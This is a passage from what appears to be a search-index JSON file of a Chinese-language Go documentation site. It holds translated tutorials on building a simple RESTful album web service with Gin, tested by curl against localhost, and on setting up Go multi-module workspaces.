\u7f16\u5199\u4ee3\u7801"},{"location":"go/web_service_gin/#write-handler2return-all-items","text":"\u5f53\u5ba2\u6237\u7aef\u5728\u53d1\u51fa GET /albums \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u5c06\u6240\u6709\u4e13\u8f91\u4ee5 JSON \u683c\u5f0f\u8fd4\u56de\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u7f16\u5199\u4ee5\u4e0b\u5185\u5bb9\uff1a \u51c6\u5907\u54cd\u5e94\u7684\u903b\u8f91 \u5c06\u8bf7\u6c42\u8def\u5f84\u6620\u5c04\u5230\u60a8\u7684\u903b\u8f91\u7684\u4ee3\u7801 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e0e\u5b83\u4eec\u5728\u8fd0\u884c\u65f6\u7684\u6267\u884c\u65b9\u5f0f\u76f8\u53cd\uff0c\u4f46\u60a8\u9996\u5148\u6dfb\u52a0\u4f9d\u8d56\u9879\uff0c\u7136\u540e\u662f\u4f9d\u8d56\u4e8e\u5b83\u4eec\u7684\u4ee3\u7801\u3002","title":"4. \u67e5\u8be2\u6240\u6709\u9879\u76ee"},{"location":"go/web_service_gin/#write-code-41","text":"\u5728\u4e0a\u4e00\u8282\u4e2d\u6dfb\u52a0\u7684\u7ed3\u6784\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee5\u83b7\u53d6\u4e13\u8f91\u5217\u8868\u3002 \u6b64 getAlbums \u51fd\u6570\u4ece album \u7ed3\u6784\u5207\u7247\u521b\u5efa JSON\uff0c\u5e76\u5c06 JSON \u5199\u5165\u54cd\u5e94\u3002 // getAlbums responds with the list of all albums as JSON. func getAlbums(c *gin.Context) { c.IndentedJSON(http.StatusOK, albums) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7f16\u5199\u4e00\u4e2a\u5e26 gin.Context \u53c2\u6570\u7684\u51fd\u6570 getAlbums \u3002\u8bf7\u6ce8\u610f\uff0c\u4f60\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u51fd\u6570\u8d77\u4efb\u4f55\u540d\u5b57\u2014\u2014Gin \u548c Go \u90fd\u4e0d\u9700\u8981\u7279\u5b9a\u7684\u51fd\u6570\u540d\u683c\u5f0f\u3002 gin.Context \u662f Gin \u6700\u91cd\u8981\u7684\u90e8\u5206\u3002\u5b83\u643a\u5e26\u8bf7\u6c42\u8be6\u7ec6\u4fe1\u606f\u3001\u9a8c\u8bc1\u548c\u5e8f\u5217\u5316 JSON \u7b49\u3002\uff08\u5c3d\u7ba1\u540d\u79f0\u76f8\u4f3c\uff0c\u4f46\u8fd9\u4e0e Go \u7684\u5185\u7f6e context \u5305\u4e0d\u540c\u3002\uff09 \u8c03\u7528 Context.IndentedJSON \u4ee5\u5c06\u7ed3\u6784\u5e8f\u5217\u5316\u4e3a JSON \u5e76\u5c06\u5176\u6dfb\u52a0\u5230\u54cd\u5e94\u4e2d\u3002 \u8be5\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u60a8\u8981\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u7684 HTTP \u72b6\u6001\u4ee3\u7801\u3002\u5728\u8fd9\u91cc\uff0c\u60a8\u4ece net/http \u5305\u4e2d\u4f20\u9012\u5e38\u91cf StatusOK \u6765\u6307\u793a 200 OK . \u8bf7\u6ce8\u610f\uff0c\u60a8\u53ef\u4ee5\u66ff\u6362 Context.IndentedJSON \u4e3a\u8c03\u7528 Context.JSON \u6765\u53d1\u9001\u66f4\u7d27\u51d1\u7684 JSON\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u7f29\u8fdb\u5f62\u5f0f\u5728\u8c03\u8bd5\u65f6\u66f4\u5bb9\u6613\u4f7f\u7528\uff0c\u5e76\u4e14\u5927\u5c0f\u5dee\u5f02\u901a\u5e38\u5f88\u5c0f\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728 albums slice \u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u7c98\u8d34\u4e0b\u9762\u7684\u4ee3\u7801\u4ee5\u5c06\u5904\u7406\u51fd\u6570\u5206\u914d\u7ed9\u7aef\u70b9\u8def\u5f84\u3002 \u8fd9\u4f1a\u5efa\u7acb\u4e00\u4e2a\u5173\u8054\uff0c\u5728\u8be5\u5173\u8054\u4e2d getAlbums \u5904\u7406\u5bf9 /albums \u7aef\u70b9\u8def\u5f84\u7684\u8bf7\u6c42\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.Run(\"localhost:8080\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u4f7f\u7528 Default \u521d\u59cb\u5316 Gin router \u3002 \u4f7f\u7528\u8be5 GET \u51fd\u6570\u5c06 GET HTTP \u65b9\u6cd5\u548c /albums \u8def\u5f84\u4e0e\u5904\u7406\u51fd\u6570\u76f8\u5173\u8054\u3002 \u8bf7\u6ce8\u610f\uff0c\u60a8\u6b63\u5728\u4f20\u9012 getAlbums \u51fd\u6570\u7684\u540d\u79f0\u3002\u8fd9\u4e0e\u4f20\u9012\u51fd\u6570\u7684\u7ed3\u679c\u4e0d\u540c\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4f20\u9012 getAlbums() \uff08\u6ce8\u610f\u62ec\u53f7\uff09\u6765\u5b8c\u6210\u3002 \u4f7f\u7528 Run \u51fd\u6570\u5c06 router \u8fde\u63a5\u5230 http.Server \u5e76\u542f\u52a8server\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728\u5305\u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u5bfc\u5165\u60a8\u9700\u8981\u652f\u6301\u60a8\u521a\u521a\u7f16\u5199\u7684\u4ee3\u7801\u7684\u5305\u3002 \u7b2c\u4e00\u884c\u4ee3\u7801\u5e94\u5982\u4e0b\u6240\u793a\uff1a package main import ( \"net/http\" \"github.com/gin-gonic/gin\" ) \u4fdd\u5b58 main.go\u3002","title":"4.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/web_service_gin/#run-code-42","text":"\u5f00\u59cb\u8ddf\u8e2a Gin \u6a21\u5757\u4f5c\u4e3a\u4f9d\u8d56\u9879\u3002 \u5728\u547d\u4ee4\u884c\u4e2d\uff0c\u4f7f\u7528 go get \u5c06 github.com/gin-gonic/gin \u6a21\u5757\u6dfb\u52a0\u4e3a\u60a8\u7684\u6a21\u5757\u7684\u4f9d\u8d56\u9879\u3002\u4f7f\u7528\u70b9\u53c2\u6570\u8868\u793a\u201c\u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u4e2d\u4ee3\u7801\u7684\u4f9d\u8d56\u9879\u201d\u3002 $ go get . go get: added github.com/gin-gonic/gin v1.7.2 \u89e3\u51b3\u5e76\u4e0b\u8f7d\u6b64\u4f9d\u8d56\u9879\u4ee5\u6ee1\u8db3\u60a8\u5728\u4e0a\u4e00\u6b65\u4e2d\u6dfb\u52a0\u7684 import \u58f0\u660e\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\u4e0b\u8fd0\u884c\u4ee3\u7801\u3002\u4f7f\u7528\u70b9\u53c2\u6570\u8868\u793a\u201c\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u8fd0\u884c\u4ee3\u7801\u201d\u3002 $ go run . \u4ee3\u7801\u8fd0\u884c\u540e\uff0c\u60a8\u5c31\u6709\u4e86\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684 HTTP \u670d\u52a1\u5668\uff0c\u60a8\u53ef\u4ee5\u5411\u5176\u53d1\u9001\u8bf7\u6c42\u3002 \u5728\u65b0\u7684\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\uff0c\u7528\u4e8e curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u60a8\u4e3a\u670d\u52a1\u64ad\u79cd\u7684\u6570\u636e\u3002 [ { \"id\": \"1\", \"title\": \"Blue Train\", \"artist\": \"John Coltrane\", \"price\": 56.99 }, { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 }, { \"id\": \"3\", \"title\": \"Sarah Vaughan and Clifford Brown\", \"artist\": \"Sarah Vaughan\", \"price\": 39.99 } ] \u4f60\u5df2\u7ecf\u542f\u52a8\u4e86\u4e00\u4e2a API\uff01\u5728\u4e0b\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528\u4ee3\u7801\u521b\u5efa\u53e6\u4e00\u4e2a\u7aef\u70b9\u6765\u5904\u7406POST\u6dfb\u52a0\u9879\u76ee\u7684\u8bf7\u6c42\u3002","title":"4.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/web_service_gin/#write-handler2add-new-item","text":"\u5f53\u5ba2\u6237\u7aef\u5728 /albums \u53d1\u51fa POST \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u5c06\u8bf7\u6c42\u6b63\u6587\u4e2d\u63cf\u8ff0\u7684\u76f8\u518c\u6dfb\u52a0\u5230\u73b0\u6709\u76f8\u518c\u7684\u6570\u636e\u4e2d\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u7f16\u5199\u4ee5\u4e0b\u5185\u5bb9\uff1a \u5c06\u65b0\u4e13\u8f91\u6dfb\u52a0\u5230\u73b0\u6709\u5217\u8868\u7684\u903b\u8f91\u3002 \u5c06 POST \u8bf7\u6c42\u8def\u7531\u5230\u60a8\u7684\u903b\u8f91\u7684\u4e00\u4e9b\u4ee3\u7801\u3002","title":"5. \u6dfb\u52a0\u4e00\u4e2a\u65b0\u9879\u76ee"},{"location":"go/web_service_gin/#write-code-51","text":"\u6dfb\u52a0\u4ee3\u7801\u4ee5\u5c06\u4e13\u8f91\u6570\u636e\u6dfb\u52a0\u5230\u4e13\u8f91\u5217\u8868\u3002 \u5728 import \u8bed\u53e5\u4e4b\u540e\u7684\u67d0\u5904\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002\uff08\u6587\u4ef6\u672b\u5c3e\u662f\u8fd9\u6bb5\u4ee3\u7801\u7684\u597d\u5730\u65b9\uff0c\u4f46 Go \u5e76\u4e0d\u5f3a\u5236\u4f60\u58f0\u660e\u51fd\u6570\u7684\u987a\u5e8f\u3002\uff09 // postAlbums adds an album from JSON received in the request body. func postAlbums(c *gin.Context) { var newAlbum album // Call BindJSON to bind the received JSON to // newAlbum. if err := c.BindJSON(&newAlbum); err != nil { return } // Add the new album to the slice. albums = append(albums, newAlbum) c.IndentedJSON(http.StatusCreated, newAlbum) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7528 Context.BindJSON \u5c06\u8bf7\u6c42\u6b63\u6587\u7ed1\u5b9a\u5230 newAlbum . \u5c06\u4ece JSON \u521d\u59cb\u5316\u7684 album \u7ed3\u6784\u8ffd\u52a0\u5230 albums \u5207\u7247\u3002 \u5411\u54cd\u5e94response\u6dfb\u52a0\u72b6\u6001\u4ee3\u7801 201 \uff0c\u4ee5\u53ca\u8868\u793a\u60a8\u6dfb\u52a0\u7684\u4e13\u8f91\u7684 JSON\u3002 \u66f4\u6539\u60a8\u7684 main \u51fd\u6570\uff0c\u4f7f\u5176\u5305\u542b\u8be5 router.POST \u51fd\u6570\uff0c\u5982\u4e0b\u6240\u793a\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 /albums \u8def\u5f84\u7684 POST \u65b9\u6cd5\u4e0e postAlbums \u51fd\u6570\u76f8\u5173\u8054\u3002 \u4f7f\u7528 Gin\uff0c\u60a8\u53ef\u4ee5\u5c06 \u5904\u7406\u7a0b\u5e8f \u4e0e HTTP \u65b9\u6cd5\u548c\u8def\u5f84\u7ec4\u5408 \u76f8\u5173\u8054\u3002\u8fd9\u6837\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u5ba2\u6237\u7aef\u4f7f\u7528\u7684\u65b9\u6cd5\u5c06\u53d1\u9001\u5230\u5355\u4e2a\u8def\u5f84\u7684\u8bf7\u6c42\u5355\u72ec\u8def\u7531\u3002","title":"5.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/web_service_gin/#run-code-52","text":"\u5982\u679c\u670d\u52a1\u5668\u4ece\u4e0a\u4e00\u8282\u5f00\u59cb\u4ecd\u5728\u8fd0\u884c\uff0c\u8bf7\u505c\u6b62\u5b83\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u6253\u5f00\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . \u4ece\u4e0d\u540c\u7684\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u7528 curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums \\ --include \\ --header \"Content-Type: application/json\" \\ --request \"POST\" \\ --data '{\"id\": \"4\",\"title\": \"The Modern Sound of Betty Carter\",\"artist\": \"Betty Carter\",\"price\": 49.99}' \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u6dfb\u52a0\u4e13\u8f91\u7684\u6807\u9898\u548c JSON\u3002 HTTP/1.1 201 Created Content-Type: application/json; charset=utf-8 Date: Wed, 02 Jun 2021 00:34:12 GMT Content-Length: 116 { \"id\": \"4\", \"title\": \"The Modern Sound of Betty Carter\", \"artist\": \"Betty Carter\", \"price\": 49.99 } \u4e0e\u4e0a\u4e00\u8282\u4e00\u6837\uff0c\u4f7f\u7528 curl \u68c0\u7d22\u5b8c\u6574\u7684\u4e13\u8f91\u5217\u8868\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u786e\u8ba4\u6dfb\u52a0\u4e86\u65b0\u4e13\u8f91\u3002 $ curl http://localhost:8080/albums \\ --header \"Content-Type: application/json\" \\ --request \"GET\" \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u4e13\u8f91\u5217\u8868\u3002 [ { \"id\": \"1\", \"title\": \"Blue Train\", \"artist\": \"John Coltrane\", \"price\": 56.99 }, { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 }, { \"id\": \"3\", \"title\": \"Sarah Vaughan and Clifford Brown\", \"artist\": \"Sarah Vaughan\", \"price\": 39.99 }, { \"id\": \"4\", \"title\": \"The Modern Sound of Betty Carter\", \"artist\": \"Betty Carter\", \"price\": 49.99 } ] \u5728\u4e0b\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4ee3\u7801\u6765\u5904\u7406GET\u7279\u5b9a\u9879\u76ee\u7684\u8bf7\u6c42\u3002","title":"5.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/web_service_gin/#write-handler2return-specific-item","text":"\u5f53\u5ba2\u6237\u7aef\u53d1\u51fa GET /albums/[id] \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u8fd4\u56de ID \u4e0eid\u8def\u5f84\u53c2\u6570\u5339\u914d\u7684\u4e13\u8f91\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\uff1a \u6dfb\u52a0\u903b\u8f91\u4ee5\u68c0\u7d22\u8bf7\u6c42\u7684\u76f8\u518c\u3002 \u5c06\u8def\u5f84\u6620\u5c04\u5230\u903b\u8f91\u3002","title":"6. \u67e5\u8be2\u7279\u5b9a\u7684\u9879\u76ee"},{"location":"go/web_service_gin/#write-code-61","text":"\u5728\u60a8\u5728\u4e0a\u4e00\u8282\u4e2d\u6dfb\u52a0\u7684 postAlbums \u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee5\u68c0\u7d22\u7279\u5b9a\u76f8\u518c\u3002 \u6b64 getAlbumByID \u51fd\u6570\u5c06\u63d0\u53d6\u8bf7\u6c42\u8def\u5f84\u4e2d\u7684 ID\uff0c\u7136\u540e\u627e\u5230\u5339\u914d\u7684\u76f8\u518c\u3002 // getAlbumByID locates the album whose ID value matches the id // parameter sent by the client, then returns that album as a response. func getAlbumByID(c *gin.Context) { id := c.Param(\"id\") // Loop over the list of albums, looking for // an album whose ID value matches the parameter. for _, a := range albums { if a.ID == id { c.IndentedJSON(http.StatusOK, a) return } } c.IndentedJSON(http.StatusNotFound, gin.H{\"message\": \"album not found\"}) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7528 Context.Param \u4ece URL \u4e2d\u68c0\u7d22 id \u8def\u5f84\u53c2\u6570\u3002\u5f53\u60a8\u5c06\u6b64\u5904\u7406\u7a0b\u5e8f\u6620\u5c04\u5230\u8def\u5f84\u65f6\uff0c\u60a8\u5c06\u5728\u8def\u5f84\u4e2d\u5305\u542b\u53c2\u6570\u7684\u5360\u4f4d\u7b26\u3002 \u5faa\u73af album \u5207\u7247\u4e2d\u7684\u7ed3\u6784\uff0c\u5bfb\u627e\u5176 ID \u5b57\u6bb5\u503c\u4e0e id \u53c2\u6570\u503c\u5339\u914d\u7684\u7ed3\u6784\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u5c06\u8be5 album \u7ed3\u6784\u5e8f\u5217\u5316\u4e3a JSON\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u54cd\u5e94\u4e0e 200 OK HTTP \u4ee3\u7801\u4e00\u540c\u8fd4\u56de\u3002 \u5982\u4e0a\u6240\u8ff0\uff0c\u73b0\u5b9e\u4e16\u754c\u7684\u670d\u52a1\u53ef\u80fd\u4f1a\u4f7f\u7528\u6570\u636e\u5e93\u67e5\u8be2\u6765\u6267\u884c\u6b64\u67e5\u627e\u3002 \u5982\u679c\u627e\u4e0d\u5230\u4e13\u8f91\uff0c\u5219\u8fd4\u56de http.StatusNotFound \u5373 HTTP 404 \u9519\u8bef\u3002 \u6700\u540e\uff0c\u66f4\u6539\u60a8\u7684main\uff0c\u4f7f\u5176\u5305\u542b\u5bf9\u8def\u5f84\u4e3a /albums/:id \u7684\u65b0\u8c03\u7528 router.GET \uff0c\u5982\u4ee5\u4e0b\u793a\u4f8b\u6240\u793a\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.GET(\"/albums/:id\", getAlbumByID) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } \u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 /albums/:id \u8def\u5f84\u4e0e getAlbumByID \u51fd\u6570\u76f8\u5173\u8054\u3002\u5728 Gin \u4e2d\uff0c\u8def\u5f84\u4e2d\u9879\u76ee\u524d\u9762\u7684\u5192\u53f7\u8868\u793a\u8be5\u9879\u76ee\u662f\u8def\u5f84\u53c2\u6570\u3002","title":"6.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/web_service_gin/#run-code-62","text":"\u5982\u679c\u670d\u52a1\u5668\u4ece\u4e0a\u4e00\u8282\u5f00\u59cb\u4ecd\u5728\u8fd0\u884c\uff0c\u8bf7\u505c\u6b62\u5b83\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u6253\u5f00\u547d\u4ee4\u884c\u4e2d\uff0c\u8fd0\u884c\u4ee3\u7801\u4ee5\u542f\u52a8\u670d\u52a1\u5668\u3002 $ go run . \u4ece\u4e0d\u540c\u7684\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u7528 curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums/2 \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u60a8\u4f7f\u7528 ID \u7684\u4e13\u8f91\u7684 JSON\u3002\u5982\u679c\u627e\u4e0d\u5230\u4e13\u8f91\uff0c\u60a8\u5c06\u6536\u5230\u5e26\u6709\u9519\u8bef\u6d88\u606f\u7684 JSON\u3002 { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 }","title":"6.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/web_service_gin/#conclusion","text":"\u606d\u559c\uff01\u60a8\u521a\u521a\u4f7f\u7528 Go \u548c Gin \u7f16\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 RESTful Web \u670d\u52a1\u3002 \u5efa\u8bae\u7684\u4e0b\u4e00\u4e2a\u4e3b\u9898\uff1a \u5982\u679c\u60a8\u662f Go \u65b0\u624b\uff0c\u60a8\u4f1a\u53d1\u73b0 Effective Go \u548c How to write Go code \u4ee3\u7801\u4e2d\u63cf\u8ff0\u7684\u6709\u7528\u7684\u6700\u4f73\u5b9e\u8df5\u3002 Go Tour \u662f\u5bf9 Go \u57fa\u7840\u77e5\u8bc6\u7684\u9010\u6b65\u4ecb\u7ecd\u3002 \u6709\u5173 Gin \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Gin Web Framework package documentation \u6216 Gin Web Framework docs \u3002","title":"\u7ed3\u8bba"},{"location":"go/web_service_gin/#completed-code","text":"\u672c\u8282\u5305\u542b\u60a8\u4f7f\u7528\u672c\u6559\u7a0b\u6784\u5efa\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u3002 package main import ( \"net/http\" \"github.com/gin-gonic/gin\" ) // album represents data about a record album. type album struct { ID string `json:\"id\"` Title string `json:\"title\"` Artist string `json:\"artist\"` Price float64 `json:\"price\"` } // albums slice to seed record album data. var albums = []album{ {ID: \"1\", Title: \"Blue Train\", Artist: \"John Coltrane\", Price: 56.99}, {ID: \"2\", Title: \"Jeru\", Artist: \"Gerry Mulligan\", Price: 17.99}, {ID: \"3\", Title: \"Sarah Vaughan and Clifford Brown\", Artist: \"Sarah Vaughan\", Price: 39.99}, } func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.GET(\"/albums/:id\", getAlbumByID) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } // getAlbums responds with the list of all albums as JSON. func getAlbums(c *gin.Context) { c.IndentedJSON(http.StatusOK, albums) } // postAlbums adds an album from JSON received in the request body. func postAlbums(c *gin.Context) { var newAlbum album // Call BindJSON to bind the received JSON to // newAlbum. if err := c.BindJSON(&newAlbum); err != nil { return } // Add the new album to the slice. albums = append(albums, newAlbum) c.IndentedJSON(http.StatusCreated, newAlbum) } // getAlbumByID locates the album whose ID value matches the id // parameter sent by the client, then returns that album as a response. func getAlbumByID(c *gin.Context) { id := c.Param(\"id\") // Loop through the list of albums, looking for // an album whose ID value matches the parameter. for _, a := range albums { if a.ID == id { c.IndentedJSON(http.StatusOK, a) return } } c.IndentedJSON(http.StatusNotFound, gin.H{\"message\": \"album not found\"}) }","title":"\u5b8c\u6574\u7684\u4ee3\u7801"},{"location":"go/web_service_gin/#references","text":"https://go.dev/doc/tutorial/web-service-gin","title":"\u53c2\u8003"},{"location":"go/workspaces/","text":"\u591a\u6a21\u5757\u5de5\u4f5c\u533a \uf0c1 \u4f7f\u7528\u591a\u6a21\u5757\u5de5\u4f5c\u533a\uff0c\u544a\u8bc9 Go \u547d\u4ee4\u60a8\u6b63\u5728\u540c\u65f6\u5728\u591a\u4e2a\u6a21\u5757\u4e2d\u7f16\u5199\u4ee3\u7801\uff0c\u5e76\u8f7b\u677e\u5730\u5728\u8fd9\u4e9b\u6a21\u5757\u4e2d\u6784\u5efa\u548c\u8fd0\u884c\u4ee3\u7801\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u5728\u5171\u4eab\u7684\u591a\u6a21\u5757\u5de5\u4f5c\u533a\u4e2d\u521b\u5efa\u4e24\u4e2a\u6a21\u5757\uff0c\u5bf9\u8fd9\u4e9b\u6a21\u5757\u8fdb\u884c\u66f4\u6539\uff0c\u5e76\u5728\u6784\u5efa\u4e2d\u67e5\u770b\u8fd9\u4e9b\u66f4\u6539\u7684\u7ed3\u679c\u3002 \u672c\u6559\u7a0b\u9700\u8981 go 1.18 \u6216\u66f4\u9ad8\u7248\u672c\u3002 \u521b\u5efa\u4e00\u4e2a\u6a21\u5757 \uf0c1 \u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\uff0c\u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a\u5de5\u4f5c\u533a\u7684\u76ee\u5f55\u3002 $ mkdir workspace $ cd workspace \u521d\u59cb\u5316\u6a21\u5757 \u521b\u5efa\u4e00\u4e2a\u4f9d\u8d56\u4e8e golang.org/x/example \u6a21\u5757\u7684\u65b0\u6a21\u5757 hello \u3002 $ mkdir hello $ cd hello $ go mod init example.com/hello go: creating new go.mod: module example.com/hello \u4f7f\u7528 go get \u547d\u4ee4\u6dfb\u52a0\u5bf9 golang.org/x/example \u6a21\u5757\u7684\u4f9d\u8d56\u9879\u3002 $ go get golang.org/x/example \u5728 hello \u76ee\u5f55\u4e0b\u521b\u5efa hello.go\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a package main import ( \"fmt\" \"golang.org/x/example/stringutil\" ) func main() { fmt.Println(stringutil.Reverse(\"Hello\")) } \u8fd0\u884chello\u7a0b\u5e8f\uff1a $ go run example.com/hello olleH \u521b\u5efa\u5de5\u4f5c\u533a \uf0c1 \u5728\u8fd9\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a go.work \u6587\u4ef6\u6765\u6307\u5b9a\u6a21\u5757\u7684\u5de5\u4f5c\u533a\u3002 \u521d\u59cb\u5316\u5de5\u4f5c\u533a \u5728 workspace \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a $ go work init ./hello \u8be5 go work init \u547d\u4ee4\u544a\u8bc9 go \u4e3a\u5de5\u4f5c\u7a7a\u95f4\u4e2d\u5305\u542b\u5728\u76ee\u5f55 ./hello \u7684\u6a21\u5757\u521b\u5efa\u4e00\u4e2a go.work \u6587\u4ef6\u3002 \u8be5 go \u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u5982\u4e0b\u6240\u793a\u7684\u6587\u4ef6 go.work \uff1a go 1.18 use ./hello \u8be5 go.work \u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e go.mod \u76f8\u4f3c\u3002 \u8be5 go \u6307\u4ee4\u544a\u8bc9 Go \u5e94\u8be5\u4f7f\u7528\u54ea\u4e2a\u7248\u672c\u7684 Go \u6765\u89e3\u91ca\u6587\u4ef6\u3002\u5b83\u7c7b\u4f3c\u4e8e go.mod \u6587\u4ef6\u4e2d\u7684go\u6307\u4ee4\u3002 \u8be5 use \u6307\u4ee4\u544a\u8bc9 Go \u5728\u8fdb\u884c\u6784\u5efa\u65f6\u76ee\u5f55 hello \u4e2d\u7684\u6a21\u5757\u5e94\u8be5\u662f\u4e3b\u6a21\u5757\u3002 \u6240\u4ee5\u5728 workspace \u7684\u4efb\u4f55\u5b50\u76ee\u5f55\u4e2d\u6a21\u5757\u90fd\u4f1a\u88ab\u6fc0\u6d3b\u3002 \u8fd0\u884c\u5de5\u4f5c\u533a\u76ee\u5f55\u4e0b\u7684\u7a0b\u5e8f \u5728workspace\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a $ go run example.com/hello olleH Go \u547d\u4ee4\u5305\u62ec\u5de5\u4f5c\u533a\u4e2d\u7684\u6240\u6709\u6a21\u5757\u4f5c\u4e3a\u4e3b\u6a21\u5757\u3002\u8fd9\u5141\u8bb8\u6211\u4eec\u5728\u6a21\u5757\u4e2d\u5f15\u7528\u4e00\u4e2a\u5305\uff0c\u751a\u81f3\u5728\u6a21\u5757\u4e4b\u5916\u3002\u5728\u6a21\u5757\u6216\u5de5\u4f5c\u533a\u4e4b\u5916\u8fd0\u884c go run \u547d\u4ee4\u4f1a\u5bfc\u81f4\u9519\u8bef\uff0c\u56e0\u4e3a\u8be5 go \u547d\u4ee4\u4e0d\u77e5\u9053\u8981\u4f7f\u7528\u54ea\u4e9b\u6a21\u5757\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06 golang.org/x/example \u6a21\u5757\u7684\u672c\u5730\u526f\u672c\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a\u3002\u7136\u540e\uff0c\u6211\u4eec\u5c06\u5411 stringutil \u5305\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4ee3\u66ff Reverse . \u4e0b\u8f7d\u548c\u4fee\u6539 golang.org/x/example \u6a21\u5757 \uf0c1 \u5728\u8fd9\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5c06\u4e0b\u8f7d\u5305\u542b golang.org/x/example \u6a21\u5757\u7684 Git \u5b58\u50a8\u5e93\u7684\u526f\u672c\uff0c\u5c06\u5176\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a\uff0c\u7136\u540e\u5411\u5176\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u6211\u4eec\u5c06\u4ece hello \u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u65b0\u51fd\u6570\u3002 